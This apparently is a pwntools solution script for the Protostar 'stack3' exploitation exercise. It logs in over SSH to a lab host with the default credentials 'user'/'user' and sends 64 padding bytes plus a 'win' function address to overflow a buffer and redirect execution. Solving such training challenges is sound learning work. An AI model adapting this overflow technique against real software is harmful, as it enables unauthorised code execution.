#!/usr/bin/env python

import time
from pwn import *

level = 3
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 64
addr = p32(0x8048424) # win

payload = padding
payload += addr

r = shell.run(binary)
r.sendline(payload)
r.recvuntil("code flow successfully changed")
r.clean()

log.success("Done!")
